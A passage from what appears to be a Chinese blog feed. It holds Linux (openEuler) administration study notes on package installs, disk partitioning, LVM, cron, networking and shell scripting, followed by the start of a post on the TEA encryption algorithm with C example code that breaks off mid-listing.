class="headerlink" title="安装软件并管理服务"></a>安装软件并管理服务</h3>              <h4 id="rpm安装"   >          <a href="#rpm安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#rpm安装" class="headerlink" title="rpm安装"></a>rpm安装</h4>      <p>rpm是一种用于互联网下载包的打包和自动安装工具，会生成具有.RPM拓展名的文件</p><p>命名格式<code>name-version-release.arch.rpm</code>（名称-版本号-发行版号-处理器架构）</p><p>优点：</p><ol><li>简单便捷兼容版本</li><li>参数信息记录在数据库中，便于查询，升级和卸载</li></ol><p>缺点：</p><ol><li>安装环境需要和打包环境一致</li><li>具有很强的依赖关系</li></ol>        <h4 id="DNF安装"   >          <a href="#DNF安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#DNF安装" class="headerlink" title="DNF安装"></a>DNF安装</h4>              <h5 id="配置DNF"   >          <a href="#配置DNF" class="heading-link"><i class="fas fa-link"></i></a><a href="#配置DNF" class="headerlink" title="配置DNF"></a>配置DNF</h5>      <p>创建本地软件源仓库</p><p>软件源是Linux系统的应用程序安装仓库</p><p>可以是网络服务器，光盘甚至是硬盘的一个目录</p><p>自动安装，方便更新，解决软件依赖，提高安装效率</p><p>目录<code>/etc/dnf/dnf.conf</code></p><p>参数配置(目录etc&#x2F;yum&#x2F;yum.repos.d)</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cachedir: 缓存目录</span><br><span class="line">best: 升级时总是尝试安装最高版本，默认为true</span><br><span class="line">installonly_limit: 设置同时安装的数量，默认为3</span><br><span class="line">clean_requirements_on_remove: 删除在dnf remove期间不再使用的依赖项，默认为true</span><br><span class="line">repository 允许用户自定义软件源仓库，各个仓库不能同名</span><br><span class="line">name = repository_name: 软件仓库描述的字符串</span><br><span class="line">baseurl = repository_url: 软件仓库的地址，例如http://, ftp://, file://</span><br></pre></td></tr></table></div></figure>        <h5 id="管理软件包-x2F-软件包组"   >          <a href="#管理软件包-x2F-软件包组" class="heading-link"><i class="fas fa-link"></i></a><a href="#管理软件包-x2F-软件包组" class="headerlink" title="管理软件包&#x2F;软件包组"></a>管理软件包&#x2F;软件包组</h5>      <p>搜索软件包</p>        <h5 id="更新"   >          <a href="#更新" class="heading-link"><i class="fas fa-link"></i></a><a href="#更新" class="headerlink" title="更新"></a>更新</h5>      <p>检查更新</p>        <h4 id="源码安装"   >          <a href="#源码安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4>      <p>优点：</p><ol><li>可以根据自身需求来设置参数</li><li>经过编译兼容性好</li></ol><p>缺点：</p><ol><li>过程繁琐</li><li>难以升级</li></ol><p>安装过程</p><ol><li>下载源码包，解压，校验完整性</li><li>创建makefile文件，<code>./configure</code></li><li>编译-通过make install安装命令，<code>默认安装路径为/usr/local/</code></li></ol><p>configure&#x2F;make&#x2F;make install</p>        <h4 id="使用systemd管理服务-systemctl"   >          <a href="#使用systemd管理服务-systemctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用systemd管理服务-systemctl" class="headerlink" title="使用systemd管理服务(systemctl)"></a>使用systemd管理服务(systemctl)</h4>      <p>systemd是与SysV和LSB初始化简本兼容的系统和服务管理器，开启systemd服务可以提供基于守护进程的按需启动策略</p><p>支持快照和系统状态恢复，维护挂载和自挂载点</p><p>使用systemctl命令</p>        <h2 id="Day-6"   >          <a href="#Day-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-6" class="headerlink" title="Day 6"></a>Day 6</h2>              <h3 id="文件系统"   >          <a href="#文件系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3>      <p>文件系统是操作系统用于明确存储设备或分区上的文件的方法和数据结构（fs: file system)</p><p>提供API，管理磁盘或分区</p><p>FAT, NTFS, NFS, RAW, Ext, XFS</p>        <h4 id="系统交换空间"   >          <a href="#系统交换空间" class="heading-link"><i class="fas fa-link"></i></a><a href="#系统交换空间" class="headerlink" title="系统交换空间"></a>系统交换空间</h4>      <p>Linux系统交换空间（swap）就是磁盘上的一块区域，当物理内存资源紧张时，将内存中不常访问的资源保存到预先设定的硬盘上的交换空间来释放该资源占用的内存。</p><p>创建swap分区：fdisk，mkswap，swapon</p><p>创建swap文件：常见文件，mkswap格式化文件，swapon启用swap文件</p>        <h4 id="磁盘的挂载和使用"   >          <a href="#磁盘的挂载和使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#磁盘的挂载和使用" class="headerlink" title="磁盘的挂载和使用"></a>磁盘的挂载和使用</h4>      <p>磁盘类型</p><p>HDD：机械硬盘</p><p>SSD：固态硬盘</p><p>接口类型：</p><p>IDE</p><p>SCSI</p><p>SATA</p><p>SAS</p><p>FC</p><p>查看磁盘信息</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l       查看所以磁盘的信息，包括已挂载和未挂载的</span><br><span class="line">df    -h       查看系统挂载，磁盘空间大小和利用率</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>磁盘分区</p><p>磁盘分区将硬盘驱动分成多个逻辑存储单元，以实现不同的功能，例如多系统，限制应用和用户的使用空间</p><p>硬盘分区分为两部分，主分区和拓展分区，主分区不可再划分。拓展分局可以划分为多个逻辑分区</p><p>Linux没有盘符的概念，通过设备名来访问，设备名放在<code>/dev/xxyN</code> xx代表磁盘类型，y为分区设备，N代表分区</p><p><code>/dev/sdb6</code>表示第二个SCSI硬盘的第二逻辑分区</p>        <h5 id="MBR方案"   >          <a href="#MBR方案" class="heading-link"><i class="fas fa-link"></i></a><a href="#MBR方案" class="headerlink" title="MBR方案"></a>MBR方案</h5>      <p>主启动记录（Master Boot Record）分区方案指定了再运行BIOS的固件上的系统如何进行分区</p><p>SCSI接口的硬盘最多只能有15个，IDE接口最多63个（包括主分区和拓展分区，主分区最多4个）</p><p>磁盘大小限制为2TB</p><p>fdisk分区工具的使用（小于2TB）</p><ol><li><p>选择某块硬盘，进入交互模式进行分区操作</p><p>fdisk &#x2F;dev&#x2F;sdb</p></li><li><p>创建拓展分区</p></li></ol><p>​n：创建新分区</p><p>​e：创建拓展分区</p><p>​回车默认起始柱面</p><p>​回车默认使用全部空间</p><p>​n：新建分区</p><p>​l：创建逻辑分区</p><p>​回车使用默认起始柱面</p><p>​定义大小  柱面值&#x2F;直接 + size</p><p>​p：打印分区信息</p><p>​w：保存退出</p>        <h5 id="GPT方案"   >          <a href="#GPT方案" class="heading-link"><i class="fas fa-link"></i></a><a href="#GPT方案" class="headerlink" title="GPT方案"></a>GPT方案</h5>      <p>GPT意味GUID分区表，驱动器上的每个分区都有一个全局唯一的标识符，对于运行统一课拓展固件接口（UEFI）固件的系统，GPT是再物理英凡上布置分区的标砖</p><p>GPT方案没有主分区和逻辑分区之分</p><p>每个硬盘最多128个分区，最多支持18EB的分区大小</p><p>parted分区工具的使用</p><p>使用parted命令</p><ol><li><p>选择某块硬盘，进入交换式</p><p>parted &#x2F;dev&#x2F;sdb</p><p>输入mklable gpt 创建分区表，用print查看分区表是否为gpt格式</p><p>输入mkpart 新建分区</p><p>q保存退出</p></li></ol>        <h5 id="格式化和挂载"   >          <a href="#格式化和挂载" class="heading-link"><i class="fas fa-link"></i></a><a href="#格式化和挂载" class="headerlink" title="格式化和挂载"></a>格式化和挂载</h5>      <p>磁盘格式化</p><p>使用mkfs命令</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdb2 </span><br></pre></td></tr></table></div></figure><p>格式化根下的sdb2分区，格式化类型为.ext4</p><p>磁盘挂载</p><p>磁盘格式化后需要挂载才可以使用</p><p>Linux下一切皆为文件，要使用磁盘需要先建立一个联系，这个联系就是一个目录，建立联系的过程我们叫做挂载</p><p>例如，我们要访问sdb2这个目录的时候，我们其实是在访问sdb2这个设备，这个目录就是我们和设备交互的接口</p><p>fsab</p><p>&#x2F;etc&#x2F;fstab文件用于存放文件系统的静态信息文件</p><p>当系统启动时，会自动从这个文件读取信息冰挂载。</p>        <h5 id="逻辑卷管理"   >          <a href="#逻辑卷管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#逻辑卷管理" class="headerlink" title="逻辑卷管理"></a>逻辑卷管理</h5>      <p>逻辑卷基础</p><p>LVM-逻辑卷管理是Linux环境中对磁盘分区进行管理的一种机制，是建立在硬盘和分区之上，文件系统之下的逻辑层</p><p>逻辑卷（lv）可以将多个磁盘分区或者块设备（pv）合并组织成为一个大的拓展分区，可以格式化成为不同的文件系统，挂载后使用</p><p>逻辑卷的创建</p><p>pvcreate</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/hda&#123;6,7,8,9&#125;       将磁盘hda的6-9分区创建成pv</span><br><span class="line">pvs         查看物理卷概要信息</span><br></pre></td></tr></table></div></figure><p>逻辑卷的管理</p><p>vgcreate用于创建LVM卷组</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bgcreate vg1000 /dev/sdb1 /dev/sdb2       创建卷组vg1000       并且将物理卷/dev/sdb1 和 /dev/sdb2添加进入</span><br><span class="line">vgdisplay vg1000      查看卷组信息</span><br></pre></td></tr></table></div></figure><p>lvcreate命令用于创建LVM逻辑卷</p><p>逻辑卷是创建在卷组之上的</p><p>逻辑卷同样需要mkfs格式化创建文件系统，mount挂载至目录</p>        <h5 id="动态调整逻辑卷"   >          <a href="#动态调整逻辑卷" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态调整逻辑卷" class="headerlink" title="动态调整逻辑卷"></a>动态调整逻辑卷</h5>      <p>逻辑卷的拓展无需卸载，可以动态的扩容</p><ol><li>vgs查看空间是否足够</li><li>使用命令lvextend -L +SIZE lv_device</li><li>调整文件系统的大小resize2fs device lv_device</li></ol><p>逻辑卷的缩容有风险，要卸载文件系统（umount）并强行检测（e2fsck -f）</p>        <h3 id="系统管理"   >          <a href="#系统管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3>              <h4 id="任务管理"   >          <a href="#任务管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h4>              <h5 id="计划执行at"   >          <a href="#计划执行at" class="heading-link"><i class="fas fa-link"></i></a><a href="#计划执行at" class="headerlink" title="计划执行at"></a>计划执行at</h5>      <p>at 命令可以直到Linux 在特定时刻运行脚本</p><p>atd 是 at 的守护进程，在系统启动时就会以后台模式运行</p><p>atd 会定期检查 &#x2F;var&#x2F;spool&#x2F;at目录， 获取通过at命令写入的任务</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y at  //安装</span><br><span class="line">systemctl start at //运行</span><br></pre></td></tr></table></div></figure><p>设置时间 绝对计时&#x2F;相对计时</p><p>以2025年6月7日为例</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at now + 4 hours         at 16:30 7.6.15</span><br><span class="line">at 16:30                 at 16：30 6/7/15</span><br></pre></td></tr></table></div></figure><p>执行权限</p><p>对于普通用户，是否执行某个脚本和命令取决于&#x2F;etc&#x2F;at.allow 和 &#x2F;etc&#x2F;at.deny 文件</p>        <h5 id="周期执行corn"   >          <a href="#周期执行corn" class="heading-link"><i class="fas fa-link"></i></a><a href="#周期执行corn" class="headerlink" title="周期执行corn"></a>周期执行corn</h5>      <p>搜索 &#x2F;var&#x2F;spool&#x2F;cron 目录，寻找以<code>/etc/passwd</code>文件中的用户名的命名的crontab文件，然后将crontab文件装入内存</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -u //设置某个用户的corn</span><br><span class="line">crontab -l //列出某个用户的cron服务</span><br><span class="line">crontab -r //删除某个任务的cron</span><br><span class="line">crontab -e //编辑某个用户的corn服务</span><br></pre></td></tr></table></div></figure><p>格式</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minute hour day-of-month month-of-year day-of-week commands</span><br></pre></td></tr></table></div></figure><p>例<code> 00 08 * * 1 commands</code>每周一早上8点执行命令</p><p>编辑配置文件</p><p>使用crontab配置是针对某个任务的，直接编辑&#x2F;etc&#x2F;crontab是针对系统的任务</p>        <h4 id="网络管理"   >          <a href="#网络管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4>              <h5 id="openEuler-系统网络"   >          <a href="#openEuler-系统网络" class="heading-link"><i class="fas fa-link"></i></a><a href="#openEuler-系统网络" class="headerlink" title="openEuler 系统网络"></a>openEuler 系统网络</h5>      <p>设备：主机内的网卡</p><p>广播地址：到达本网段上所有主机的地址</p><p>接口：为使用设备，驱动程序在设备上创建了接口</p><p>子网掩码：将IP地址分成网络地址和主机地址两部分的掩码</p><p>路由：IP包跨网段访问时候的下一跳地址</p><p>链路：身背到网络的链接</p><p>配置文件</p><p>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*</p><p>修改后记得重启</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload NetworkManager</span><br></pre></td></tr></table></div></figure><p>查看IP地址</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr show [设备名]</span><br><span class="line">id -s link show [设备名] RX表示接受的，TX表示传送的</span><br></pre></td></tr></table></div></figure>        <h5 id="NetworkManager"   >          <a href="#NetworkManager" class="heading-link"><i class="fas fa-link"></i></a><a href="#NetworkManager" class="headerlink" title="NetworkManager"></a>NetworkManager</h5>      <p>NetworkManager是系统中动态控制及配置网络的守护进程</p><p>使用nmcli命令</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmcli con add con-name &#x27;Demo&#x27; type Ethernet ifname eth0  //创建链接</span><br><span class="line">nmcli con up &#x27;Demo&#x27;                                      //启动链接</span><br></pre></td></tr></table></div></figure><p>路由：要让网络上的两台主机能相互通信，就需要有一种能够描述如何从一台主机到另一台主机的机制，称为路由选(Routing)</p><p>路由项：一对预先定义的地址，包括目的地(Destination)和网关(Gateway)</p><p>路由项的意义在于能够通过网关完成通信，路由表是多个路由项的集合</p><p>openEuler使用route来查看配置管理本机路由</p><p>直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在<code>/etc/rc.local</code>中添加route命令来保证该路由设置永久有效。</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route -n       //查看路由表</span><br></pre></td></tr></table></div></figure>        <h5 id="主机名"   >          <a href="#主机名" class="heading-link"><i class="fas fa-link"></i></a><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h5>      <p>主机名是一个局域网中唯一标识一台机器的名称</p><p>主机不一定是物理机器，也可以是虚拟机，信息存放于文件&#x2F;etc&#x2F;hostname中</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostname new-name  //临时设置主机名</span><br><span class="line">hostnamectl set-hostname new-name  //永久设置主机名</span><br><span class="line">或者直接在文件/etc/hostname中写入</span><br></pre></td></tr></table></div></figure><p>host文件</p><p>主机可以通过IP访问</p><p>但是随着主机数量的增加，IP难以记忆，希望通过主机名直接访问其他主机</p><p>host就是一张记录主机名和IP地址的表</p><p>DNS</p><p>当host找不到域名对应的IP时，就会将域名提交给域名解析服务器(DNS)，然后DNS返回IP给主机，这个过程成为域名解析</p><p>DNS就像是一个公共的hosts文件&#x2F;分布式数据库</p><p>查询DNS</p><p>使用nslookup命令查询DNS中的记录</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup domain [dns-server](非必选)</span><br></pre></td></tr></table></div></figure>        <h4 id="进程管理"   >          <a href="#进程管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h4>              <h5 id="进程"   >          <a href="#进程" class="heading-link"><i class="fas fa-link"></i></a><a href="#进程" class="headerlink" title="进程"></a>进程</h5>      <p>进程(Process)是计算机中已运行程序的实体，是程序的一个具体实现</p><p>每个Linux进程被创建的时候会被分配给一段内存空间(PCB)</p><p>进程的生命周期</p><p>每个进程都有一个唯一的进程ID(PID)，用于追踪</p><p>任何进程都可以通过复制自己地址空间的方式创建子进程，子进程中记录着父进程的(PID)</p><p>第一个系统进程是systemd，其他进程都是其后代</p><p>进程的优先级</p><p>CPU的资源(时间片)分配是按照进程的优先级(priority)</p><p>优先级高的进程有优先执行的权利</p><p>PRI 优先级</p><p>实时进程：0-99</p><p>非实时进程：100-139</p><p>使用nice和renice命令来调整进程的优先级</p><p>前台程序与后台程序</p>        <h2 id="Day-7"   >          <a href="#Day-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-7" class="headerlink" title="Day 7"></a>Day 7</h2>              <h3 id="shell脚本"   >          <a href="#shell脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h3>      <p>shell是系统的用户界面，提供用户与内核进行交互操作的一种接口。将输入的命令提交到内核，并返回结果给用户</p><p>查看shell</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells       查看系统默认安装shell</span><br><span class="line">echo $SHELL           查看当前登陆用户默认shell</span><br><span class="line">echo $0               查看当前shell</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>一个程序和命令只做好一件事，复杂的问题通过多个命令的组合来解决</p><p>最简单的shell的脚本就是一系列命名构成的可执行文件，并且可以被其他脚本复用</p><p>没 有 银 弹</p><p>编写shell</p><p>在任意文本编辑器中均可编写</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim demo.sh</span><br></pre></td></tr></table></div></figure><p>开头注明使用的解释器，和对脚本的描述</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">My first shell script</span></span><br><span class="line">echo &#x27;hello world&#x27;</span><br></pre></td></tr></table></div></figure><p>shell是脚本语言，无需编译，仅是提供接口</p><p>执行脚本</p><p>执行时要注意权限</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./demo.sh</span><br></pre></td></tr></table></div></figure><p>一个shell想要可执行，还得脚本所在的路径在$PATH变量中</p><p>后台执行脚本</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./my_script.sh &amp;       后台执行脚本</span><br><span class="line">nohup ./my_script &amp;    退出shell后继续运行（stdout和stderr均重定向到nohup.out文件</span><br></pre></td></tr></table></div></figure>        <h3 id="shell编程基础"   >          <a href="#shell编程基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#shell编程基础" class="headerlink" title="shell编程基础"></a>shell编程基础</h3>              <h4 id="文本流"   >          <a href="#文本流" class="heading-link"><i class="fas fa-link"></i></a><a href="#文本流" class="headerlink" title="文本流"></a>文本流</h4>      <p>标准输入，标准输出，标准错误</p><p>标准输入通过命令行输入，标准输出和错误将会回显</p><p>重定向</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">command &lt; inputfile   从右边的文件读取输入</span><br><span class="line">例：wc -l &lt; /dev/null</span><br><span class="line">command &lt;&lt; maker      内联重定向</span><br><span class="line">ls &gt; dir_log          将标准输出覆盖文件内容</span><br><span class="line">ls &gt;&gt; dir_log         将标准输出追加到文件中</span><br></pre></td></tr></table></div></figure><p>管道</p><p>将一个命令的输出连到另一个命令的输入</p>        <h4 id="字符变量和运算"   >          <a href="#字符变量和运算" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符变量和运算" class="headerlink" title="字符变量和运算"></a>字符变量和运算</h4>      <p># 注释</p><p>shell的变量是无类型的</p><p>变量分为环境变量和用户自定义的变量</p><p>用 printenv查看全局变量</p>        <h4 id="结构化命令"   >          <a href="#结构化命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#结构化命令" class="headerlink" title="结构化命令"></a>结构化命令</h4>      <p>条件</p><p>循环</p><p>for，while，until</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for var in list</span><br><span class="line">do</span><br><span class="line">commands</span><br><span class="line">done</span><br></pre></td></tr></table></div></figure><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..100..2&#125;</span><br><span class="line">do</span><br><span class="line">let &quot;sum+=i&quot;</span><br><span class="line">done</span><br><span class="line">echo $sum</span><br></pre></td></tr></table></div></figure><p>展示目录下所有文件</p><figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line"></span><br><span class="line">for file in $(ls)</span><br><span class="line">do</span><br><span class="line">echo &quot;file:$file&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用加密算法</title>
      <link href="/2022/07/02/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2022/07/02/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[        <h1 id="常见加密算法"   >          <a href="#常见加密算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a>常见加密算法</h1>              <h2 id="Tea加密及其变种"   >          <a href="#Tea加密及其变种" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tea加密及其变种" class="headerlink" title="Tea加密及其变种"></a>Tea加密及其变种</h2>      <p>注意Tea，xTea和xxTea都是分组算法，输入会被分为以若干个字节组成的组元，逆向时要注意类型的转换</p><p>若寄存器溢出还得加上<code>&amp;0xffffffff</code></p>        <h3 id="Tea"   >          <a href="#Tea" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h3>      <p>在密码学中，<strong>微型加密算法</strong>（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132156860" alt="img"></p><p>代码样例</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">//magic number</span></span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">//sum = 次数 * magic number</span></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">//magic number </span></span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;  </span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数  </span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);  </span><br><span class="line">    encrypt(v, k);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span 